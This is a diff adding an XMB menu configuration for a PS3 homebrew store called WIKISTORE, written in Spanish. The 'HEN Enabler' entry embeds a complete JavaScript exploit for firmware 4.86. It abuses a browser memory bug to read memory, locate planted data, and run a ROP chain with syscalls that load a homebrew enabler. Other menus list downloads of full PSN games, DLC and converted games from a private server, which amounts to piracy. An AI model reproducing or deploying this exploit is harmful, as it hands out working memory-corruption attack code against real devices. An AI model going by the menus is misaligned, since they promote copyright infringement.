@@ -1,0 +1,770 @@
+<XMBML version="1.0">
+
+<!-- HFW 4.86 WIKISTORE 1.0.4 [Ultimo Update: 07/05/2020] -->
+
+       <!-- Logo/icono XMB -->
+
+	<View id="thewizwiki_store_xmb_main"> 
+		<Attributes> 
+			<Table key="thewizwiki_main">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/ICON0.PNG</String></Pair>
+				<Pair key="icon_notation"><String>WNT_XmbItemAlbum</String></Pair>
+				<Pair key="pic"><String>/dev_hdd0/game/WIKISTORE/PIC1.PNG</String></Pair>
+				<Pair key="pic_notation"><String>WNT_XmbItemAlbum</String></Pair>
+				<Pair key="title"><String>★ WIKISTORE 4.86 ★</String></Pair>
+				<Pair key="info"><String>Version 1.0.4  </String></Pair>
+				<Pair key="ingame"><String>disable</String></Pair>
+			</Table>
+			
+		</Attributes>
+			<Items>
+			<Query 
+				class="type:x-xmb/folder-pixmap"
+				key="thewizwiki_main"
+				attr="thewizwiki_main"
+				src="#thewizwiki_main_items"/>
+			</Items>
+		</View>		
+		
+<!-- Menu principal -->
+		
+		<View id="thewizwiki_main_items"> 
+		<Attributes>
+		    <Table key="hen_enabler_486">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/hen.png</String></Pair>
+				<Pair key="title"><String>HEN Enabler 3.0.1</String></Pair>
+				<Pair key="info"><String>Habilita la instalacion de PKG, Hombrew y Licencias para activar contenido y poder jugar</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,mbytes=1048576,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,stat_size_offset=40,toc_addr=7296336,gadget1_addr=620036,gadget8_addr=131072,gmod1_addr=6352696,gmod2_addr=80756,gmod3_addr=757248,gmod4a_addr=890500,gmod7_addr=108204,gmod8_addr=2862264,gmod4b_addr=0x42c778,gmod4c_addr=0x054af0,gmod15_addr=0x39d038,gmod12_addr=0x63315c,gmod9_addr=0x010b20,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),progress_msg_frag1="\74h1\76Enabling \74s\76HEN\74/s\76 ",progress_msg_frag2="%\74/h1\76",fail_msg_frag=\47\74div id="c" class="fail"\76\74/div\76\74div id="d"\76\74s\76HEN\74/s\76 \74b\76Exploit initialization failed!\74/b\76\74/div\76\47,fsopen=0x321,fsread=0x322,fswrite=0x323,fsclose=0x324,fsstat=0x328;if(fwv==="4.86"){(toc_addr=7296344),(gadget1_addr=620036),(gadget8_addr=131072),(gmod1_addr=6352856),(gmod2_addr=80756),(gmod3_addr=757248),(gmod4a_addr=890500),(gmod4b_addr=4376440),(gmod4c_addr=346864),(gmod7_addr=108204),(gmod8_addr=2862264),(gmod9_addr=68384),(gmod12_addr=6500860),(gmod15_addr=3788856)}function show(str){document.getElementById("result").innerHTML=str}function scall_r3r5_p2p(sc,r3_ptr,r4,r5_ptr,r6,r7,r8,r9,r10,r31out){if(r31out===null){r31out=gtemp_addr}return(hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod1_addr)+fill16(0x50,dbyte41)+fill4(0xc,dbyte41)+hw(sc)+hw(r10)+hw(r8)+hw(r7)+hw(r6)+fill4(0x4,dbyte41)+hw(r4)+fill4(0x4,dbyte41)+hw(r9)+fill16(0x10,dbyte41)+hdw(r5_ptr-0x4)+hdw(gtemp_addr)+fill8(0x18,dbyte41)+hdw(gmod4c_addr)+fill16(0xb0,dbyte41)+hdw(r3_ptr)+fill16(0x10,dbyte41)+hdw(gmod4b_addr)+fill16(0x60,dbyte41)+hdw(r31out)+hdw(sp_exit)+fill8(0x8,dbyte41))}function load_r3_word_from_ptr_32(offset,r26out,r27out,r28out,r29out,r30out,r31out){return(hdw(gmod3_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+hdw(offset-0x8)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod15_addr)+fill16(0x50,dbyte41)+fill8(0x8,dbyte41)+hdw(r26out)+hdw(r27out)+hdw(r28out)+hdw(r29out)+hdw(r30out)+hdw(r31out)+hdw(sp_exit)+fill8(0x8,dbyte41))}function h2b(hex_val){return String.fromCharCode(hex_val)}function hw(hex_val){return(String.fromCharCode(hex_val\76\7616)+String.fromCharCode(hex_val))}function hdw(hex_val){return hw(0)+hw(hex_val)}String.prototype.toHex16=function(){return("0000"+this).substr(-4)};String.prototype.toAscii=function(hex_16){var ascii="";var i=0;while(i\74this.length){if(hex_16===true){ascii+=this.charCodeAt(i).toString(16).toHex16()}else{ascii+=this.charCodeAt(i).toString(16)}i+=1}return ascii};String.prototype.convert=function(ascii){if(this.length\741){return""}var asciistr="";var asciichr="";var i=0;var ret=[];if(ascii===true){asciistr=this}else{asciistr=this.toAscii()}while(asciistr.length%4!==0){asciistr+="00"}if(asciistr.substr(asciistr.length-3,2)!=="00"){asciistr+="0000"}while(i\74asciistr.length){asciichr=asciistr.substr(i,4);ret.push(String.fromCharCode(parseInt(asciichr,16)));i+=4}return ret.join("")};String.prototype.convertedSize=function(ascii){if(this.length\741){return 0}var asciistr="";if(ascii===true){asciistr=this}else{asciistr=this.toAscii()}while(asciistr.length%4!==0){asciistr+="00"}if(asciistr.substr(asciistr.length-3,2)!=="00"){asciistr+="0000"}return asciistr.length/2};String.prototype.replaceAt=function(index,ch){return this.substr(0,index)+ch+this.substr(index+ch.length)};String.prototype.repeat=function(num){return new Array(num+1).join(this)};Number.prototype.noExponents=function(){var data=String(this).split(/[eE]/);if(data.length===1){return data[0]}var z="",sign=this\740?"-":"",str=data[0].replace(".",""),mag=Number(data[1])+1;if(mag\740){z=sign+"0.";while(mag++){z+="0"}return z+str.replace(/^\-/,"")}mag-=str.length;while(mag--){z+="0"}return str+z};function fromIEEE754(bytes,ebits,fbits){var retNumber=0;var bits=[];var i;var j;var byte;for(i=bytes.length;i;i-=1){byte=bytes[i-1];for(j=8;j;j-=1){bits.push(byte%2?1:0);byte=byte\76\761}}bits.reverse();var str=bits.join("");var bias=(1\74\74(ebits-1))-1;var s=parseInt(str.substring(0,1),2)?-1:1;var e=parseInt(str.substring(1,1+ebits),2);var f=parseInt(str.substring(1+ebits),2);if(e===(1\74\74ebits)-1){retNumber=f!==0?NaN:s*Infinity}else if(e\760){retNumber=s*Math.pow(2,e-bias)*(1+f/Math.pow(2,fbits))}else if(f!==0){retNumber=s*Math.pow(2,-(bias-1))*(f/Math.pow(2,fbits))}else{retNumber=s*0}return retNumber.noExponents()}function generateIEEE754(address,size){var hex=new Array((address\76\7624)\460xff,(address\76\7616)\460xff,(address\76\768)\460xff,address\460xff,(size\76\7624)\460xff,(size\76\7616)\460xff,(size\76\768)\460xff,size\460xff);return fromIEEE754(hex,11,52)}function generateExploit(address,size){var n=(address\74\7432)|((size\76\761)-1);return generateIEEE754(address,n-address)}function rmem(address,size){if(document.getElementById("exploit")){document.getElementById("exploit").style.src="local("+generateExploit(address,size)+")"}}function cmem(address,size,len){if(document.getElementById("exploit")){rmem(address,size);return document.getElementById("exploit").style.src.substr(6,len)}}function trigger(exploit_addr){if(document.getElementById("trigger")){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+exploit_addr.toString(16)+")")}}function lc1(){if(total_loops\74max_loops){t_out=setTimeout(initROP,500,false)}else{total_loops=0;show(fail_msg_frag);t_out=0}}function lc2(){if(total_loops\74max_loops){t_out=setTimeout(initROP2,500,false)}else{total_loops=0;show(fail_msg_frag);2;t_out=0}}function findJsVariableOffset(name,exploit_data,base,size){rmem(base,size);var dat=document.getElementById("exploit").style.src.substr(6,size),i=0,t,k,match,exploit_addr;while(i\74dat.length*2){if(dat.charCodeAt(i/2)===exploit_data.charCodeAt(0)){match=0;for(k=0;k\74exploit_data.length*2;k+=0x2){if(dat.charCodeAt((i+k)/2)!==exploit_data.charCodeAt(k/2)){break}match+=1}if(match===exploit_data.length){exploit_addr=base+i+4;for(t=0;t\74offset_array.length;t+=1){if(offset_array[t]===exploit_addr){return-1}}offset_array.push(exploit_addr);return exploit_addr}}i+=0x10}return 0}function memcpy(dest,src,len){return callsub(gadget8_addr,dest,src,len,0,0,0,0,0,0,0x70)}function stack_frame_hookup(){return(unescape("\u4141\u2A2F")+hw(gadget1_addr)+hw(toc_addr)+fill16(0x20,dbyte41)+hdw(toc_addr)+fill16(0x70,dbyte41))}function scall(sc,r3,r4,r5,r6,r7,r8,r9,r10,r31out){if(r31out===null){r31out=gtemp_addr}return(hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod1_addr)+fill16(0x50,dbyte41)+fill4(0xc,dbyte41)+hw(sc)+hw(r10)+hw(r8)+hw(r7)+hw(r6)+hw(r5)+hw(r4)+fill4(0x4,dbyte41)+hw(r9)+fill16(0x20,dbyte41)+hdw(r3)+fill16(0x10,dbyte41)+hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod4a_addr)+fill16(0x60,dbyte41)+hdw(r31out)+hdw(sp_exit)+fill8(0x8,dbyte41))}function callsub(sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31in,r31out){var min_stack_size=0x20;if(r31out===null){r31out=gtemp_addr}if(r31in===null){r31in=gtemp_addr}return(hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod1_addr)+fill16(0x50,dbyte41)+fill4(0xc,dbyte41)+hw(r11)+hw(r10)+hw(r8)+hw(r7)+hw(r6)+hw(r5)+hw(r4)+fill4(0x4,dbyte41)+hw(r9)+fill16(0x20,dbyte41)+hdw(r3)+fill16(0x10,dbyte41)+hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(r31in)+fill16(0x10,dbyte41)+hdw(sub)+fill16(sub_frame_size-min_stack_size,dbyte00)+hdw(r31out)+hdw(sp_exit)+fill8(0x8,dbyte41))}function fillNbytes(nbytes,hex_val,N){var stemp="",iterator=0,tmp=h2b(hex_val);while(iterator\74nbytes/N){stemp+=tmp.repeat(N/2);iterator++}return stemp}function fill4(nbytes,hex_val){return fillNbytes(nbytes,hex_val,4)}function fill8(nbytes,hex_val){return fillNbytes(nbytes,hex_val,8)}function fill16(nbytes,hex_val){return fillNbytes(nbytes,hex_val,16)}function strncmp(str1,str2,n){str1=str1.substring(0,n);str2=str2.substring(0,n);return str1==str2?0:str1\76str2?1:-1}function rop_exit_hen(fail){var chk="53434500";var chk2=cmem(0x8a000000,0x10,3);chk2=chk2.toAscii(true);if(strncmp(chk,chk2,4)!=0){show(\47\74div id="c" class="fail"\76\74/div\76\74b\76Failed! Rebooting!\74/b\76\47);initROP2(true)}else{window.close()}}function initROP2(init){try{if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0;total_loops=0}if(t_out!==0){clearTimeout(t_out);t_out=0}offset_array=[];stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;stack_frame=stack_frame_hookup()+stack_frame_swap(0x8a060000);while(stack_frame_addr===0){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;if(frame_fails%10===0){search_base_off+=0;search_size_ext+=0}lc2();return}stack_frame=stack_frame.replaceAt(0,h2b(0x2a2f));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\74search_size+search_size_ext){frame_fails++;lc2();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill16(0x30,0x8282)+hw(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\74search_size){lc2();return}jump_2=jump_2.replaceAt(0,h2b(0x7efb));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hw(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\74search_size){lc2();return}jump_1=jump_1.replaceAt(0,h2b(0x7efa));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}var sf=cmem(stack_frame_addr-0x4,0x8000,stack_frame.length);var j2=cmem(jump_2_addr-0x4,0x1000,jump_2.length);var j1=cmem(jump_1_addr-0x4,0x1000,jump_1.length);if(j2===jump_2\46\46j1===jump_1\46\46sf===stack_frame){if(t_out!==0){clearTimeout(t_out)}setTimeout(trigger,1000,jump_1_addr)}else{lc2()}}catch(e){show("HEN installation failed because the following exception was thrown during execution: "+e+" at: "+e.lineNumber)}}function initROP(init){try{if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;var usb_sp="/dev_flash/hen/PS3HEN.BIN";xtra_data=start_x.convert()+usb_sp.convert()+index_key.convert(true)+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\74search_size){lc1();return}xtra_data=xtra_data.replaceAt(0,h2b(0x7efd));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}var usb_fp_addr=xtra_data_addr+start_x.convertedSize()-0x4;index_key_addr=usb_fp_addr+usb_sp.convertedSize();stack_frame=stack_frame_hookup()+scall(0x321,usb_fp_addr,0,0x8e000000,0,0,0,0,0)+scall_r3r5_p2p(0x322,0x8e000000,0x8a000000,0x300000,0x8e000008,0,0,0,0,0,0)+stack_frame_swap(0x8a000000);while(stack_frame_addr===0){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;if(frame_fails%10===0){search_base_off+=0;search_size_ext+=0}lc1();return}stack_frame=stack_frame.replaceAt(0,h2b(0x2a2f));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\74search_size+search_size_ext){frame_fails++;lc1();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill16(0x30,0x8282)+hw(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\74search_size){lc1();return}jump_2=jump_2.replaceAt(0,h2b(0x7efb));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hw(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\74search_size){lc1();return}jump_1=jump_1.replaceAt(0,h2b(0x7efa));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}var sf=cmem(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=cmem(xtra_data_addr-0x4,0x1000,xtra_data.length);var j2=cmem(jump_2_addr-0x4,0x1000,jump_2.length);var j1=cmem(jump_1_addr-0x4,0x1000,jump_1.length);if(j2===jump_2\46\46j1===jump_1\46\46x===xtra_data\46\46sf===stack_frame){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{lc1()}}catch(e){show("HEN installation failed because the following exception was thrown during execution: "+e+" at: "+e.lineNumber)}}function stack_frame_swap(new_stack_addr){return(hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+hdw(new_stack_addr)+fill8(0x8,dbyte41)+hdw(gmod9_addr))}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit_hen,4500,"\74b\76HEN Failed!\74/b\76");t_out=0;total_loops=0}document.write(\47\74html\76\74head\76\74title\76PS3Xploit - HEN Enabler\74/title\76\74style\76html{color:#fff;left:100%;overflow:hidden;position:relative}*{font-weight:100;font-size:32px !important}#a{display:table;height:100%;left:-100%;position:relative;width:100%;text-align:center}#b{display:table-cell;text-align:center;vertical-align:middle;width:100%}#c{-webkit-animation:s 2s infinite;-webkit-border-radius:10px;background:#6f0;display:inline-block;height:48px;right:24px;position:absolute;top:28px;width:48px}#c.fail{background:#f00}#d{position:relative;z-index:1}#result{-webkit-border-radius:10px;background:#000;display:inline-block;font-weight:700;padding:32px;padding-right:92px;position:relative}@-webkit-keyframes s{0%{-webkit-transform:rotate(0)}100%,90%{-webkit-transform:rotate(540deg)}}input{opacity:0}b{color:#f00}s{color:#6f0;text-decoration:none;font-weight:800}\74/style\76\74/head\76\74body\76\74div id="exploit"\76\74/div\76\74div id="trigger"\76\74/div\76\74div id="a"\76 \74input type="radio" autofocus/\76\74div id="b"\76\74div id="result"\76\74div id="c"\76\74/div\76\74div id="d"\76Enabling \74s\76HEN\74/s\76\74/div\76\74/div\76\74/div\76\74/div\76\74/body\76\74/html\76\47);setTimeout(function(){initROP(true)},0);');</String></Pair>
+			</Table>
+           <Table key="juegos_ps3">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/juegos.png</String></Pair>
+				<Pair key="title"><String>Juegos</String></Pair>
+				<Pair key="info"><String>Descarga e instala juegos para tu PS3</String></Pair>
+			</Table>			
+			<Table key="han_external_content">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/store.png</String></Pair>
+				<Pair key="title"><String>Otras descargas y utilidades</String></Pair>
+				<Pair key="info"><String>Descarga e instala diferente contenido para tu consola</String></Pair>
+			</Table>
+			<Table key="info_news">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/piratear.png</String></Pair>
+				<Pair key="title"><String>Libera por completo tu consola con Toolset</String></Pair>
+				<Pair key="info"><String>Con esta herramienta si tu consola es compatible pordras instalar CFW (No requiere HEN)</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>https://www.ps3xploit.net/bgtoolset/</String></Pair>
+				<Pair key="ingame"><String>disable</String></Pair>
+			</Table>
+			<Table key="han_advanced_menu">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/herramientas.png</String></Pair>
+				<Pair key="title"><String>Herramientas Avanzadas</String></Pair>
+				<Pair key="info"><String>Otras herramientas utiles</String></Pair>
+			</Table>
+		</Attributes>
+			<Items>	
+            <Query 
+				class="type:x-xmb/module-action"
+				key="hen_enabler_486"
+				attr="hen_enabler_486"
+				/>
+            <Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="juegos_ps3" 
+				attr="juegos_ps3"
+				src="#juegos_ps3_main"
+				/>				
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="han_external_content" 
+				attr="han_external_content"
+				src="#han_external_content_main"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="info_news"
+				attr="info_news"
+				/>
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="han_advanced_menu" 
+				attr="han_advanced_menu"
+				src="#han_advanced_menu_main"
+				/>
+			</Items>
+		</View>		
+
+<!-- Submenu Juegos -->	
+
+        <View id="juegos_ps3_main"> 
+		<Attributes> 
+			<Table key="demo_downloader_main">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/demosps3.png</String></Pair>
+				<Pair key="title"><String>Demos PS3 PSN (juegos completos)</String></Pair>
+				<Pair key="info"><String>Descarga Demos de Todas las Regiones</String></Pair>
+			</Table>
+			<Table key="psnstuff_PSN_EU">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/psnstuff.png</String></Pair>
+				<Pair key="title"><String>PS3 PSN EUR</String></Pair>
+				<Pair key="info"><String>Descarga Juegos region EUR Completos</String></Pair>
+			</Table>
+			<Table key="psnstuff_PSN_US">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/psnstuff.png</String></Pair>
+				<Pair key="title"><String>PS3 PSN USA</String></Pair>
+				<Pair key="info"><String>Descarga Juegos region USA Completos</String></Pair>
+			</Table>
+			<Table key="juegos_segundoplano">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/juegos2plano.png</String></Pair>
+				<Pair key="title"><String>Descarga juegos en segundo plano</String></Pair>
+				<Pair key="info"><String>Descarga juegos de PS3 PSN en segundo plano</String></Pair>
+			</Table>
+			<Table key="Contenido_DLC_US">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/dlcus.png</String></Pair>
+				<Pair key="title"><String>DLC PSN US</String></Pair>
+				<Pair key="info"><String>Descarga contenido extra descargable de juegos USA</String></Pair>
+			</Table>
+			<Table key="Contenido_DLC_EU">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/dlceu.png</String></Pair>
+				<Pair key="title"><String>DLC PSN EU</String></Pair>
+				<Pair key="info"><String>Descarga contenido extra descargable de juegos EUR</String></Pair>
+			</Table>
+			<Table key="psx_downloader">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/psx.png</String></Pair>
+				<Pair key="title"><String>PSX PSN</String></Pair>
+				<Pair key="info"><String>Descarga e instala juegos de PS1</String></Pair>
+			</Table>
+			<Table key="juegos_extra_psx">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/psx extra.png</String></Pair>
+				<Pair key="title"><String>Juegos PSX exclusivos WIKISTORE</String></Pair>
+				<Pair key="info"><String>Lista de juegos de PS2 convertidos que subimos en el server privado</String></Pair>
+			</Table>
+			<Table key="ps2_downloader">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/ps2.png</String></Pair>
+				<Pair key="title"><String>PS2 PSN</String></Pair>
+				<Pair key="info"><String>Descarga e instala juegos de PS2 de todas las regiones</String></Pair>
+			</Table>
+			<Table key="juegos_extra_ps2">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/ps2extra.png</String></Pair>
+				<Pair key="title"><String>Juegos PS2 exclusivos WIKISTORE</String></Pair>
+				<Pair key="info"><String>Lista de juegos de PS2 convertidos que subimos en el server privado</String></Pair>
+			</Table>
+			<Table key="Juegos_PSP">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/psp.png</String></Pair>
+				<Pair key="title"><String>PSP PSN</String></Pair>
+				<Pair key="info"><String>Descarga e instala juegos de PSP de todas las regiones</String></Pair>
+			</Table>
+			<Table key="retro_downloader">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/retro.png</String></Pair>
+				<Pair key="title"><String>Descarga juegos RETRO de diferentes plataformas</String></Pair>
+				<Pair key="info"><String>Juegos de consolas antiguas zona nostalgica</String></Pair>
+			</Table>
+			<Table key="juegos_extra">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/juegosextra.png</String></Pair>
+				<Pair key="title"><String>Juegos PS3 PSN exclusivos WIKISTORE que habeis pedido (peticiones)</String></Pair>
+				<Pair key="info"><String>Lista de juegos de PSN que han pedido algunos cavernicolas</String></Pair>
+			</Table>
+			<Table key="juegos_convertidos">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/juegosconvertidos.png</String></Pair>
+				<Pair key="title"><String>Juegos PS3 exclusivos WIKISTORE</String></Pair>
+				<Pair key="info"><String>Juegos en formato carpeta convertidos a pkg CFW2OFW</String></Pair>
+			</Table>
+			<Table key="game_fix">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/fix.png</String></Pair>
+				<Pair key="title"><String>Fixes para juegos</String></Pair>
+				<Pair key="info"><String>Si algun juego no funciona mira que no este un fix en esta seccion</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+            <Query
+				class="type:x-xmb/folder-pixmap"
+				key="demo_downloader_main"
+				attr="demo_downloader_main" 
+				src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/demos/demo_downloader.xml#demo_downloader_items"
+				/>
+            <Query
+				class="type:x-xmb/folder-pixmap"
+                key="psnstuff_PSN_EU"
+                attr="psnstuff_PSN_EU"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/psnstuff/psnstuff_PSN_EU.xml#psnstuff_PSN_EU_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+                key="psnstuff_PSN_US"
+                attr="psnstuff_PSN_US"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/psnstuff/psnstuff_PSN_US.xml#psnstuff_PSN_US_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+                key="juegos_segundoplano"
+                attr="juegos_segundoplano"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/juegosensegundoplano/juegos_segundoplano.xml#juegos_segundoplano_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+                key="Contenido_DLC_US"
+                attr="Contenido_DLC_US"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/dlc/Contenido_DLC_US.xml#Contenido_DLC_US_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+                key="Contenido_DLC_EU"
+                attr="Contenido_DLC_EU"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/dlc/Contenido_DLC_EU.xml#Contenido_DLC_EU_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+                key="psx_downloader"
+                attr="psx_downloader"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/psx/psx_downloader.xml#psx_downloader_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+                key="juegos_extra_psx"
+                attr="juegos_extra_psx"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/psx/juegos_extra_psx.xml#juegos_extra_psx_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+                key="ps2_downloader"
+                attr="ps2_downloader"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/ps2/ps2_downloader.xml#ps2_downloader_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+                key="juegos_extra_ps2"
+                attr="juegos_extra_ps2"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/ps2/juegos_extra_ps2.xml#juegos_extra_ps2_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+                key="Juegos_PSP"
+                attr="Juegos_PSP"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/psp/Juegos_PSP.xml#Juegos_PSP_items"
+				/>
+            <Query
+				class="type:x-xmb/folder-pixmap"
+                key="retro_downloader"
+                attr="retro_downloader"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/retro/retro_downloader.xml#retro_downloader_items"
+				/>
+            <Query
+				class="type:x-xmb/folder-pixmap"
+                key="juegos_extra"
+                attr="juegos_extra"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/juegosextra/juegos_extra.xml#juegos_extra_items"
+				/>
+            <Query
+				class="type:x-xmb/folder-pixmap"
+                key="juegos_convertidos"
+                attr="juegos_convertidos"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/juegosconvertidos/juegos_convertidos.xml#juegos_convertidos_items"
+				/>
+            <Query
+				class="type:x-xmb/folder-pixmap"
+                key="game_fix"
+                attr="game_fix"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/fixes/game_fix.xml#game_fix_items"
+				/>				
+            </Items>
+		</View>				
+
+<!-- Contenido Externo - Otras descargas y utilidades -->
+			
+		<View id="han_external_content_main"> 
+		<Attributes> 
+			<Table key="theme_downloader">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/theme.png</String></Pair>
+				<Pair key="title"><String>Temas</String></Pair>
+				<Pair key="info"><String>Descargar e instalar temas (p3t)</String></Pair>
+			</Table>
+			<Table key="wallpaper_downloader">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/wallpaper.png</String></Pair>
+				<Pair key="title"><String>Wallpapers (Fondos de pantalla)</String></Pair>
+				<Pair key="info"><String>Vista previa y descarga de fondos (jpg)</String></Pair>
+			</Table>
+			<Table key="font_downloader">
